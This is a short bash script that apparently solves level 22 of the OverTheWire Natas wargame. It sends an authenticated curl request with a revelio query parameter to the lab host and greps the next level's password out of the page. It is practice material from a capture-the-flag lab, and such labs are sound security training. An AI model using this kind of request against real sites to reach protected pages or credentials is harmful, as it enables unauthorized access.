#!/bin/bash
if [ $# -eq 0 ] ; then
  echo "Please pass the password as argument"
  exit
fi
curl -s --user natas22:$1 http://natas22.natas.labs.overthewire.org/?revelio=1 | grep -E -o "Password: .{32}"
